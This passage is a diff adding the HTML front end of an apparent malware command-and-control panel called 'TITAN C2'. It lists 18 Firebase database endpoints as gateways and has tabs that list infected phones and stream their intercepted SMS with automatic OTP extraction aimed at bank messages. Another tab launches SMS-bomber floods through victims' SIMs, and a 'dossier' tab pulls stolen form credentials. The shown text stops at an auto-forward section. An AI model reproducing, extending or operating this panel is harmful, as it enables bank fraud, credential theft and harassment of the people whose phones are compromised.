@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>TITAN C2 COMMAND // Quantum Telemetry & OTP Deck</title>
+    <meta name="description" content="TITAN C2 COMMAND - Elite Real-Time Quantum Telemetry & Automated Carrier Interceptor Deck">
+    <meta name="theme-color" content="#030712">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700;800&family=Orbitron:wght@600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body data-planet="siyan">
+
+    <!-- Quantum C2 Atmospheric Layer & Cyber Grid -->
+    <div class="win12-desktop-bg">
+        <div class="win12-aurora aurora-1"></div>
+        <div class="win12-aurora aurora-2"></div>
+        <div class="win12-aurora aurora-3"></div>
+        <div class="ambient-bg"></div>
+    </div>
+
+    <!-- Floating Quantum Data Sparks -->
+    <div class="sakura-container" id="sakuraContainer">
+        <span class="sakura-petal p1">⚡</span>
+        <span class="sakura-petal p2">💠</span>
+        <span class="sakura-petal p3">✨</span>
+        <span class="sakura-petal p4">⚡</span>
+        <span class="sakura-petal p5">🌟</span>
+        <span class="sakura-petal p6">✨</span>
+    </div>
+
+    <!-- Windows 12 Mobile Top System Bar -->
+    <header class="win12-top-bar">
+        <div class="win12-top-left">
+            <button class="win12-brand-pill" onclick="openServerModal()" title="TITAN C2 Hub // Server Switcher">
+                <div class="titan-avatar-crest">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+                </div>
+                <span class="status-dot" id="statusDot"></span>
+            </button>
+            <div class="status-text-mobile" id="statusText">TITAN C2 READY</div>
+        </div>
+
+        <div class="win12-top-center">
+            <button class="win12-server-switcher-pill" onclick="openServerModal()" title="Switch Gateway">
+                <span class="server-active-indicator"></span>
+                <span class="server-pill-title" id="headerServerName">SIYAN PRIME ⚡</span>
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
+            </button>
+        </div>
+
+        <div class="win12-top-right">
+            <div class="header-time" id="headerTime">00:00</div>
+            <button class="win12-quick-lock-btn" onclick="logout()" title="Lock / Disengage">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            </button>
+        </div>
+    </header>
+
+    <!-- Hidden compatibility elements to guarantee DOM selector safety -->
+    <div class="status-bar" style="display:none !important;">
+        <div class="status-bar-left"></div>
+        <div class="status-bar-center"></div>
+        <span class="orbit-status-tag" style="display:none;">ORBIT LOCK</span>
+    </div>
+    <div class="app-header" style="display:none !important;">
+        <div class="header-info"><p></p></div>
+        <div class="header-actions">
+            <button class="logout-btn" onclick="logout()"></button>
+        </div>
+    </div>
+
+    <!-- Windows 12 Mobile Start Menu / Gateway Action Sheet -->
+    <div class="server-modal" id="serverModal">
+        <div class="win12-start-backdrop" onclick="closeServerModal()"></div>
+        <div class="win12-start-flyout">
+            <div class="sheet-handle" onclick="closeServerModal()"></div>
+            
+            <div class="win12-start-header">
+                <div class="win12-user-badge">
+                    <div class="win12-user-avatar">
+                        <div class="titan-flyout-crest">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+                        </div>
+                    </div>
+                    <div class="win12-user-meta">
+                        <span class="win12-user-name">TITAN QUANTUM C2 // GATEWAYS</span>
+                        <span class="win12-user-sub">Active High-Throughput RTDB Conduits</span>
+                    </div>
+                </div>
+                <button class="win12-modal-close-btn" onclick="closeServerModal()" title="Close">✕</button>
+            </div>
+
+            <div class="win12-pinned-label">ONLINE GATEWAY NETWORK (18 ACTIVE NODES)</div>
+
+                        <div class="server-list">
+                <!-- 1. SIYAN PRIME -->
+                <button class="server-btn" onclick="selectServer('https://siyan-b2-default-rtdb.firebaseio.com', 'siyan')">
+                    <div class="server-icon icon-purple">
+                        <span>⚡</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SIYAN PRIME</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 2. SHADOW MATRIX -->
+                <button class="server-btn" onclick="selectServer('https://fuckoff-1d8ba-default-rtdb.firebaseio.com', 'fuckoff')">
+                    <div class="server-icon icon-red">
+                        <span>💀</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SHADOW MATRIX</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 3. RAVI SOLARIS -->
+                <button class="server-btn" onclick="selectServer('https://ravihh-93a45-default-rtdb.firebaseio.com', 'ravihh')">
+                    <div class="server-icon icon-gold">
+                        <span>🌟</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">RAVI SOLARIS</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 4. NEON CARNIVAL -->
+                <button class="server-btn" onclick="selectServer('https://k-party-admin-panel-default-rtdb.firebaseio.com', 'kparty')">
+                    <div class="server-icon icon-pink">
+                        <span>🎉</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">NEON CARNIVAL</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 5. CYBER VORTEX -->
+                <button class="server-btn" onclick="selectServer('https://yarakename-default-rtdb.firebaseio.com', 'yarakename')">
+                    <div class="server-icon icon-cyan">
+                        <span>🚀</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">CYBER VORTEX</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 6. IRON AEGIS -->
+                <button class="server-btn" onclick="selectServer('https://hhhg-b94a2-default-rtdb.firebaseio.com', 'hhhg')">
+                    <div class="server-icon icon-emerald">
+                        <span>🛡️</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">IRON AEGIS</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 7. DIAMOND APEX -->
+                <button class="server-btn" onclick="selectServer('https://dddd-ae486-default-rtdb.firebaseio.com', 'dddd')">
+                    <div class="server-icon icon-purple">
+                        <span>💎</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">DIAMOND APEX</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 8. INFERNO NOVA -->
+                <button class="server-btn" onclick="selectServer('https://hhuu-72f1a-default-rtdb.firebaseio.com', 'hhuu')">
+                    <div class="server-icon icon-red">
+                        <span>🔥</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">INFERNO NOVA</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 9. TERRA PULSE -->
+                <button class="server-btn" onclick="selectServer('https://pmkisa-26930-default-rtdb.firebaseio.com', 'pmkisa')">
+                    <div class="server-icon icon-emerald">
+                        <span>🌾</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">TERRA PULSE</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 10. TITAN SNIPER -->
+                <button class="server-btn" onclick="selectServer('https://sk-penal-default-rtdb.firebaseio.com', 'skpanel')">
+                    <div class="server-icon icon-cyan">
+                        <span>🎯</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">TITAN SNIPER</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 11. GOLDEN VAULT -->
+                <button class="server-btn" onclick="selectServer('https://refer-and-earn-c5740-default-rtdb.firebaseio.com', 'refer')">
+                    <div class="server-icon icon-gold">
+                        <span>💰</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">GOLDEN VAULT</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 12. SAKURA BLOOM -->
+                <button class="server-btn" onclick="selectServer('https://alit-a3420-default-rtdb.firebaseio.com', 'alit')">
+                    <div class="server-icon icon-pink">
+                        <span>🌸</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">SAKURA BLOOM</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 13. BLACK PANDA -->
+                <button class="server-btn" onclick="selectServer('https://panda21-4f440-default-rtdb.firebaseio.com', 'panda')">
+                    <div class="server-icon icon-purple">
+                        <span>🐼</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">BLACK PANDA</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 14. ORBITAL COSMOS -->
+                <button class="server-btn" onclick="selectServer('https://m05960864-6140e-default-rtdb.firebaseio.com', 'm0596')">
+                    <div class="server-icon icon-cyan">
+                        <span>🛰️</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">ORBITAL COSMOS</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 15. THUNDER VOLT -->
+                <button class="server-btn" onclick="selectServer('https://go-is-if-default-rtdb.firebaseio.com', 'goisif')">
+                    <div class="server-icon icon-gold">
+                        <span>⚡</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">THUNDER VOLT</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 16. RAHUL PHANTOM -->
+                <button class="server-btn" onclick="selectServer('https://rahul-26832-default-rtdb.firebaseio.com', 'rahul')">
+                    <div class="server-icon icon-cyan">
+                        <span>🏹</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">RAHUL PHANTOM</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 17. MISHRA EMPIRE -->
+                <button class="server-btn" onclick="selectServer('https://mishra-d9db2-default-rtdb.firebaseio.com', 'mishra')">
+                    <div class="server-icon icon-gold">
+                        <span>👑</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">MISHRA EMPIRE</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+
+                <!-- 18. LALAN STRIKE -->
+                <button class="server-btn" onclick="selectServer('https://lalan-mehra-default-rtdb.firebaseio.com', 'lalan')">
+                    <div class="server-icon icon-red">
+                        <span>⚔️</span>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name">LALAN STRIKE</span>
+                    </div>
+                    <div class="server-arrow">›</div>
+                </button>
+            </div>
+
+            <div class="win12-start-footer">
+                <span class="win12-sys-spec">TITAN-C2-QUANTUM-OS // V4.0</span>
+                <button class="win12-power-btn" onclick="logout()" title="Lock Console">
+                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"></path><line x1="12" y1="2" x2="12" y2="12"></line></svg>
+                    <span>Lock</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden compatibility elements for desktop window bar (retains selectors) -->
+    <div style="display:none !important;">
+        <div class="win12-window-titlebar">
+            <div class="win12-segmented-tabs">
+                <button class="win12-tab-pill active" data-tab="sender">Nodes</button>
+                <button class="win12-tab-pill" data-tab="logs">Intercepts</button>
+                <button class="win12-tab-pill" data-tab="bomber">Injector</button>
+                <button class="win12-tab-pill" data-tab="pages">Archives</button>
+            </div>
+            <div class="win12-window-controls">
+                <button class="win12-win-btn win-min">─</button>
+                <button class="win12-win-btn win-max">□</button>
+                <button class="win12-win-btn win-close">✕</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Windows 12 Mobile Application Container -->
+    <div class="win12-app-container">
+        <div class="win12-window">
+            <!-- Scrollable Content Viewport -->
+            <main class="main-content" id="mainContent">
+
+                <!-- ===== TAB 1: NODES (PROBES) ===== -->
+                <section class="tab-panel active" id="panelSender">
+                    <!-- Micro Stats Grid -->
+                    <div class="stats-row">
+                        <div class="stat-chip stat-suspects">
+                            <div class="stat-glow-bar"></div>
+                            <div class="stat-inner">
+                                <span class="stat-icon-wrap">🛰️</span>
+                                <div class="stat-meta">
+                                    <span class="stat-value" id="deviceCountVal">0</span>
+                                    <span class="stat-label">TOTAL</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stat-chip stat-green">
+                            <div class="stat-glow-bar"></div>
+                            <div class="stat-inner">
+                                <span class="stat-icon-wrap">🟢</span>
+                                <div class="stat-meta">
+                                    <span class="stat-value" id="onlineCountVal">0</span>
+                                    <span class="stat-label">ONLINE</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stat-chip stat-red">
+                            <div class="stat-glow-bar"></div>
+                            <div class="stat-inner">
+                                <span class="stat-icon-wrap">🌑</span>
+                                <div class="stat-meta">
+                                    <span class="stat-value" id="mutedCountVal">0</span>
+                                    <span class="stat-label">MUTED</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Search Box -->
+                    <div class="search-box">
+                        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" class="search-icon"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                        <input type="text" id="deviceSearch" class="search-input" placeholder="Search target by ID, model, or SIM number..." oninput="refreshDeviceList()">
+                    </div>
+
+                    <!-- Segmented Filter Pills -->
+                    <div class="filter-row">
+                        <button class="pill active" data-filter="all" onclick="setDeviceFilter('all')">ALL NODES</button>
+                        <button class="pill" data-filter="active" onclick="setDeviceFilter('active')">🟢 ONLINE ONLY</button>
+                        <button class="pill" data-filter="offline" onclick="setDeviceFilter('offline')">🔴 OFFLINE</button>
+                        <button class="pill" data-filter="muted" onclick="setDeviceFilter('muted')">MUTED</button>
+                    </div>
+
+                    <!-- Action Row -->
+                    <div class="action-row">
+                        <button class="action-btn action-primary" id="fetchDevicesBtn" onclick="fetchDevices()">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"/></svg>
+                            <span>SCAN TARGET PROBES ⚡</span>
+                        </button>
+                        <div class="action-sub-grid">
+                            <button class="action-btn action-glass" onclick="selectAllDevices()">SELECT ALL</button>
+                            <button class="action-btn action-danger" onclick="toggleMuteSelected()">MUTE SEL</button>
+                            <button class="action-btn action-success" onclick="unmuteSelected()">UNMUTE</button>
+                        </div>
+                    </div>
+
+                    <!-- Device List -->
+                    <div class="device-list" id="deviceList">
+                        <div class="empty-state" id="deviceEmpty">
+                            <div class="empty-planet-icon">🌸</div>
+                            <p>No Active Probes In C2 Telemetry</p>
+                            <span>Tap "SCAN TARGET PROBES" to initialize telemetry stream</span>
+                        </div>
+                    </div>
+
+                    <!-- Pagination -->
+                    <div class="pagination" id="devicePagination" style="display:none;">
+                        <button class="page-btn" id="devicePrevBtn" onclick="prevDevicePage()" disabled>‹ PREV</button>
+                        <span class="page-info" id="devicePageInfo">1 / 1</span>
+                        <button class="page-btn" id="deviceNextBtn" onclick="nextDevicePage()" disabled>NEXT ›</button>
+                    </div>
+                </section>
+
+                <!-- ===== TAB 2: INTERCEPTS (SMS FEED) ===== -->
+                <section class="tab-panel" id="panelLogs">
+                    <div class="panel-hero-bar">
+                        <div class="panel-hero-info">
+                            <h2>Decrypted Intercepts // C2 Feed ⚡</h2>
+                            <p>Autonomous carrier transmission intercepts with instant automated OTP extraction engine</p>
+                        </div>
+                        <button class="action-btn action-primary action-btn-compact" id="fetchSmsBtn" onclick="fetchAllSms()">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                            <span>Stream Intercept Feed 🛰️</span>
+                        </button>
+                    </div>
+
+                    <!-- Live Intercept Search & Filters -->
+                    <div class="search-box">
+                        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" class="search-icon"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                        <input type="text" id="smsSearch" class="search-input" placeholder="Search sender (SBI, HDFC, OTP) or keyword..." oninput="onSmsSearchInput()">
+                    </div>
+
+                    <div class="filter-row">
+                        <button class="pill active" id="smsFilterAll" onclick="setSmsFilter('all')">ALL MESSAGES</button>
+                        <button class="pill" id="smsFilterOtp" onclick="setSmsFilter('otp')">🔥 OTP ONLY</button>
+                    </div>
+
+                    <div class="sms-list" id="smsList">
+                        <div class="empty-state" id="smsEmpty">
+                            <div class="empty-planet-icon">🌸</div>
+                            <p>No Telemetry Transmissions Intercepted</p>
+                            <span>Tap "Stream Intercept Feed" to monitor incoming signals</span>
+                        </div>
+                    </div>
+
+                    <!-- Pagination -->
+                    <div class="pagination" id="smsPagination" style="display:none;">
+                        <button class="page-btn" id="smsPrevBtn" onclick="prevSmsPage()" disabled>‹ PREV</button>
+                        <span class="page-info" id="smsPageInfo">1 / 1</span>
+                        <button class="page-btn" id="smsNextBtn" onclick="nextSmsPage()" disabled>NEXT ›</button>
+                    </div>
+                </section>
+
+                <!-- ===== TAB 3: INJECTOR (SWARM BOMBER & NORMAL MESSAGE) ===== -->
+                <section class="tab-panel" id="panelBomber">
+                    <div class="panel-hero-bar">
+                        <div class="panel-hero-info">
+                            <h2>Carrier Swarm SMS Injector ⚡</h2>
+                            <p>Deploy high-priority normal SMS or carrier saturation swarm vector</p>
+                        </div>
+                    </div>
+
+                    <!-- Mode Switcher: Swarm Bomber vs Normal Message -->
+                    <div class="mode-switcher-row">
+                        <button class="mode-btn active" data-mode="bomber" onclick="setBomberMode('bomber')">
+                            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
+                            <span>SWARM BOMBER</span>
+                        </button>
+                        <button class="mode-btn" data-mode="normal" onclick="setBomberMode('normal')">
+                            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                            <span>NORMAL MESSAGE</span>
+                        </button>
+                    </div>
+
+                    <div style="display:flex; justify-content:flex-end; margin-bottom: 10px;">
+                        <span class="bomber-device-info-badge" id="bomberDeviceInfo">0 nodes available</span>
+                    </div>
+
+                    <!-- Target Configuration Card -->
+                    <div class="form-card win12-card">
+                        <div class="card-header-meta">
+                            <span class="card-header-badge" id="bomberConfigBadge">CARRIER TARGET CONFIG</span>
+                        </div>
+
+                        <!-- Normal Mode Device Selection -->
+                        <div class="form-group" id="normalSettings" style="display:none;">
+                            <label class="form-label">SENDER DEVICE (PROBE / CONDUIT)</label>
+                            <select id="normalSenderSelect" class="mobile-select">
+                                <option value="">— Select Sender Device —</option>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">TARGET PHONE NUMBER</label>
+                            <input type="tel" id="bomberTarget" class="mobile-input text-input" placeholder="Enter target number (+919876543210)">
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">PAYLOAD TEXT</label>
+                            <input type="text" id="bomberMessage" class="mobile-input text-input" placeholder="Enter message text payload..." maxlength="160" oninput="document.getElementById('charCount').textContent = this.value.length">
+                            <div class="char-counter"><span id="charCount">0</span>/160 chars</div>
+                        </div>
+
+                        <div class="form-row form-row-sim">
+                            <div class="form-group" style="flex:1;">
+                                <label class="form-label">DISPATCH SIM</label>
+                                <div class="sim-toggle">
+                                    <button class="sim-btn active" data-slot="1" onclick="selectBomberSim(1)">SIM 1</button>
+                                    <button class="sim-btn" data-slot="2" onclick="selectBomberSim(2)">SIM 2</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Stepper Controls (Active in Swarm Bomber Mode) -->
+                        <div id="bomberSettings">
+                            <div class="bomber-stepper-grid">
+                                <div class="stepper-box">
+                                    <label class="form-label">INJECTION COUNT</label>
+                                    <div class="stepper-input-wrap">
+                                        <input type="number" id="bomberCount" class="stepper-input" value="50" min="1" max="10000">
+                                    </div>
+                                    <div class="stepper-btn-row">
+                                        <button class="step-btn" onclick="adjustBomberCount(-10)">-10</button>
+                                        <button class="step-btn" onclick="adjustBomberCount(-1)">-1</button>
+                                        <button class="step-btn" onclick="adjustBomberCount(1)">+1</button>
+                                        <button class="step-btn" onclick="adjustBomberCount(10)">+10</button>
+                                    </div>
+                                </div>
+
+                                <div class="stepper-box">
+                                    <label class="form-label">INTERVAL DELAY (MS)</label>
+                                    <div class="stepper-input-wrap">
+                                        <input type="number" id="bomberDelay" class="stepper-input" value="200" min="50" max="10000">
+                                    </div>
+                                    <div class="stepper-btn-row">
+                                        <button class="step-btn" onclick="adjustBomberDelay(-100)">-100</button>
+                                        <button class="step-btn" onclick="adjustBomberDelay(-10)">-10</button>
+                                        <button class="step-btn" onclick="adjustBomberDelay(10)">+10</button>
+                                        <button class="step-btn" onclick="adjustBomberDelay(100)">+100</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Launch Actions -->
+                        <div class="bomber-action-cluster" style="margin-top:16px;">
+                            <button class="action-btn action-primary bomber-launch-btn" id="bomberLaunchBtn" onclick="startBomber()">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
+                                <span>LAUNCH SWARM DISPATCH ⚡</span>
+                            </button>
+                            <button class="action-btn action-danger bomber-stop-btn" id="bomberStopBtn" onclick="stopBomber()" style="display:none;">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/></svg>
+                                <span>ABORT MISSION</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Live Telemetry Card -->
+                    <div class="win12-card bomber-status-card">
+                        <div class="bomber-status-header">
+                            <span class="card-header-badge">DISPATCH TELEMETRY & AUDIT LOG</span>
+                            <div class="bomber-stats-pills">
+                                <span class="badge-pill stat-total">TOTAL: <strong id="bomberTotalCount">0</strong></span>
+                                <span class="badge-pill stat-sent">SENT: <strong id="bomberSentCount">0</strong></span>
+                                <span class="badge-pill stat-fail">FAIL: <strong id="bomberFailCount">0</strong></span>
+                            </div>
+                        </div>
+
+                        <!-- Progress Bar -->
+                        <div class="bomber-progress-wrap" id="bomberProgress" style="display:none; margin: 12px 0;">
+                            <div class="bomber-progress-bar">
+                                <div class="bomber-progress-fill" id="bomberProgressFill" style="width: 0%;"></div>
+                            </div>
+                            <div class="bomber-progress-meta">
+                                <span id="bomberProgressText">Injecting payload 0 / 0</span>
+                                <span id="bomberProgressPercent">0%</span>
+                            </div>
+                        </div>
+
+                        <!-- Console Log -->
+                        <div class="bomber-console-box" id="bomberLog">
+                            <div class="empty-state" id="bomberLogEmpty">
+                                <p>Carrier array standing by // Awaiting dispatch command</p>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- ===== TAB 4: DOSSIER (PAGES) ===== -->
+                <section class="tab-panel" id="panelPages">
+                    <div class="panel-hero-bar">
+                        <div class="panel-hero-info">
+                            <h2>Orbital Intercept Dossier</h2>
+                            <p>Decrypted deep space form fields, credentials & metadata</p>
+                        </div>
+                        <button class="action-btn action-primary action-btn-compact" onclick="fetchPagesData()">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                            <span>Sweep Dossier</span>
+                        </button>
+                    </div>
+
+                    <div class="pages-list" id="pagesList">
+                        <div class="empty-state">
+                            <div class="empty-planet-icon">📑</div>
+                            <p>No Dossier Records Intercepted</p>
+                            <span>Tap "Sweep Dossier" to extract recovered form credentials</span>
+                        </div>
+                    </div>
+                </section>
+            </main>
+        </div>
+    </div>
+
+    <!-- Windows 12 Mobile Floating Pill Taskbar / Ergonomic Dock -->
+    <nav class="win12-taskbar" id="bottomNav">
+        <!-- TITAN Tactical Core Start Button -->
+        <button class="win12-start-trigger" onclick="openServerModal()" title="TITAN C2 Hub // Server Switcher">
+            <div class="titan-dock-crest">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+            </div>
+        </button>
+
+        <div class="win12-taskbar-divider"></div>
+
+        <!-- 4 Ergonomic Mobile Tabs -->
+        <div class="win12-taskbar-apps">
+            <button class="nav-item active" data-tab="sender" onclick="switchTab('sender')" title="Probes & Target Nodes">
+                <div class="nav-icon-box">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                        <rect x="2" y="2" width="20" height="8" rx="2" ry="2"/>
+                        <rect x="2" y="14" width="20" height="8" rx="2" ry="2"/>
+                        <line x1="6" y1="6" x2="6.01" y2="6"/>
+                        <line x1="6" y1="18" x2="6.01" y2="18"/>
+                    </svg>
+                </div>
+                <span>Nodes</span>
+                <div class="nav-active-pip"></div>
+            </button>
+
+            <button class="nav-item" data-tab="logs" onclick="switchTab('logs')" title="Decrypted Signals / SMS">
+                <div class="nav-icon-box">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
+                    </svg>
+                    <span class="badge nav-badge" id="smsCountBadge">0</span>
+                </div>
+                <span>Intercepts</span>
+                <div class="nav-active-pip"></div>
+            </button>
+
+            <button class="nav-item" data-tab="bomber" onclick="switchTab('bomber')" title="Swarm Injector">
+                <div class="nav-icon-box">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                    </svg>
+                </div>
+                <span>Inject</span>
+                <div class="nav-active-pip"></div>
+            </button>
+
+            <button class="nav-item" data-tab="pages" onclick="switchTab('pages')" title="Archives & Dossier">
+                <div class="nav-icon-box">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                        <rect x="3" y="4" width="18" height="16" rx="2" />
+                        <circle cx="9" cy="10" r="2" />
+                        <line x1="15" y1="8" x2="17" y2="8" />
+                        <line x1="15" y1="12" x2="17" y2="12" />
+                        <line x1="7" y1="16" x2="17" y2="16" />
+                    </svg>
+                </div>
+                <span>Dossier</span>
+                <div class="nav-active-pip"></div>
+            </button>
+        </div>
+
+        <div class="win12-taskbar-divider"></div>
+
+        <!-- Quick Refresh Action Trigger -->
+        <button class="win12-quick-action-btn" onclick="fetchDevices()" title="Quick Refresh">
+            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <polyline points="23 4 23 10 17 10" />
+                <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10" />
+            </svg>
+        </button>
+    </nav>
+
+    <!-- Node Infiltration Flyout / Bottom Sheet -->
+    <div class="sheet-overlay" id="deviceSheet">
+        <div class="sheet-backdrop" onclick="closeSheet()"></div>
+        <div class="sheet-container" id="sheetContainer">
+            <div class="sheet-handle" onclick="closeSheet()"></div>
+
+            <div class="sheet-header">
+                <div class="win12-sheet-title-meta">
+                    <div class="win12-sheet-icon">🛰️</div>
+                    <div>
+                        <h2 id="sheetTitle">Node Infiltration Console</h2>
+                        <div class="sheet-device-id" id="sheetDeviceId"></div>
+                    </div>
+                </div>
+                <button class="sheet-close" onclick="closeSheet()" title="Close Sheet">✕</button>
+            </div>
+
+            <div class="sheet-info" id="sheetInfo">Interrogating node telemetry...</div>
+
+            <div class="sheet-row" style="margin-bottom: 12px; margin-top: 8px;">
+                <button class="action-btn action-primary" style="width:100%; min-height:44px;" onclick="fetchDeviceMoreDetails()">
+                    DEEP FORENSIC SCAN 🔍
+                </button>
+            </div>
+
+            <div id="sheetMoreDetails" style="display:none; margin-bottom: 14px; padding: 14px; background: rgba(255, 255, 255, 0.04); border-radius: 14px; border: 1px solid var(--orbit-border);"></div>
+
+            <!-- Single Direct Message Dispatch -->
+            <div class="sheet-section">
+                <h3>Direct Message Dispatch ⚡</h3>
+                <input type="tel" id="sheetPhone" class="mobile-input" placeholder="Destination mobile number (+91...)">
+                <input type="text" id="sheetMessage" class="mobile-input" placeholder="Enter message payload text">
+                <div class="sheet-row">
+                    <div class="sim-toggle sim-sm">
+                        <button class="sim-btn active" data-slot="1" onclick="selectSheetSim(1)">SIM 1</button>
+                        <button class="sim-btn" data-slot="2" onclick="selectSheetSim(2)">SIM 2</button>
+                    </div>
+                    <button class="action-btn action-primary" onclick="sendSingleMessage()" style="flex:1;">Dispatch 🚀</button>
+                </div>
+            </div>
+
+            <!-- Quantum Relay Auto-Forward -->
